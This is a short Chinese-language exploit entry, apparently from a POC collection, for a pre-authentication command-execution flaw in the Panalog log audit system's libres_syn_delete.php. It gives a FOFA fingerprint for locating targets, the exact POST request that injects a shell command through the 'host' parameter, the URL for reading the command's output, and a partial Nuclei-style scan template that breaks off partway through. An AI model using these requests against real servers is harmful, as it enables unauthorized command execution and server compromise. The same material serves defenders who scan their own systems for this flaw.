# Panalog日志审计系统libres_syn_delete.php前台存在命令执行漏洞

- **系统**：Panalog　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="Panabit-Panalog"`
- **请求**：`POST /content-apply/libres_syn_delete.php HTTP/1.1`
- **关键头**：`Host: your-ip`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
token=1&id=2&host=id >1.txt
[http://ip/content-apply/1.txt](http://ip/content-apply/1.txt)
POC
id: Panalog-RCE
info:
name: Panalog 日志审计系统 libres_syn_delete.php接口处存在RCE漏洞，恶意攻击者可能会利用此漏洞执行恶意代码，最终导致服务器失陷。
author: HackTwo
severity: high
metadata:
fofa-query: app="Panabit-Panalog"
variables:
filename: "{{to_lower(rand_base(10))}}"
boundary: "{{to_lower(rand_base(20))}}"
http:
- raw:
-
POST /content-apply/libres_syn_delete.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
token=1&id=2&host= echo "Hello World!" >{{filename}}.txt
-
GET /content-apply/{{filename}}.txt HTTP/…（脚本共 705 字，完整版见原文）
```